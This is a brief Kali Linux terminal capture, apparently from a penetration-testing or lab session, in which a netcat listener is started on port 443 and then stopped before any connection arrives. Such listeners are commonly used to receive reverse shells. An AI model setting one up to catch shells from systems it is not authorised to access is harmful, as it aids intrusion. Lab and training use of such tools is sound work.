                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ 

```